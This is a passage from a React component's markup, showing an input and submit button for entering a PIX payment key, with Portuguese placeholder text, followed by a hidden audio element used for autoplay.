              onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
              placeholder="Digite sua chave PIX..."
              className="flex-1 bg-[#161c24] border border-[#2d3748] text-white rounded-full px-5 py-3 text-sm focus:outline-none focus:border-[#ff9029]"
            />
            <button 
              onClick={() => handleAction("submit_pix")}
              className="w-12 h-12 bg-[#ff9029] text-white rounded-full flex items-center justify-center hover:bg-[#e87f1f] transition-colors shadow-lg"
            >
              <ArrowRight size={20} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Audio Player Oculto para autoplay e controle */}
      {audioUrl && (
         <audio ref={audioRef} style={{ display: 'none' }} />
      )}
    </div>
  );
}
